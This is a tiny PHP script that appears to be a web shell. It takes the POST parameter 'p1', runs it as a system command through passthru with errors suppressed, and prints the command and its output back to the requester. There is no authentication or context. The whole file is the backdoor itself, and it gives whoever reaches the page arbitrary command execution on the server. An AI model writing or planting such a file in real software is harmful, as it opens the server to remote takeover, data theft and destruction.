<?php
function ex($in) {
	$out = '';
	if(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}
	return $out;
}

if(!empty($_POST['p1']))
	echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>